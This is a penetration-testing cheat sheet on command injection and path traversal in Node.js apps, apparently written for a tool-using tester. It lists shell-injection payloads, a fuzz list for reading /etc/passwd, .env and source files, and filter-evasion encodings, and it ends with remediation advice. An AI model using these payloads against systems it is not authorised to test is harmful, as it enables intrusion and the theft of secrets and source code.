# Command injection & path traversal (Node)

## Command injection
`child_process.exec` / `execSync` run a shell, so metacharacters in any value
reaching them (ping/dns tools, converters, git/ffmpeg/imagemagick wrappers,
filenames) inject commands. `spawn`/`execFile` with `shell:true`, or argument
injection, also bite.
- Payloads (try in a JSON body via `http_request`): `; id`, `| id`, `&& id`,
  `$(id)`, `` `id` ``, newline `%0aid`, `& id &`. Blind? Use timing
  `; sleep 5` / `$(sleep 5)` and watch the response-time delta, or out-of-band.
- Sweep with one `http_fuzz` on the value, `match_regex:"uid=\\d+\\("` to flag the
  shell output of `id` automatically.

## Path traversal / local file read
Any `?file=` / `?path=` / `?template=` / `?download=` / `?lang=` value passed to
`fs.readFile` / `res.sendFile` / `require` without normalization.
- Sweep depths + targets in ONE `http_fuzz`: `url:".../download?file=FUZZ"`,
  `match_regex:"root:.*:0:0:"`,
  `payloads:["/etc/passwd","../../../../etc/passwd","..%2f..%2f..%2fetc%2fpasswd",
  "....//....//etc/passwd","../../../app.js","../../../.env","../package.json"]`.
- URL-encode (`%2e%2e%2f`) and double-encode (`%252e`) to dodge a naive
  `replace('../','')`. Reading `app.js` / `server.js` / `.env` / `package.json`
  leaks source, routes and secrets. `require()` of a traversed `.js` ⇒ code exec.

Evidence: `id` / `uid=...` output (cmd) or `/etc/passwd` / source contents
(traversal).
Remediation: avoid `exec`; use `execFile`/`spawn` with an args array and no shell;
validate against an allowlist; `path.resolve` then confine under a base dir
(`path.relative` must not start with `..`).
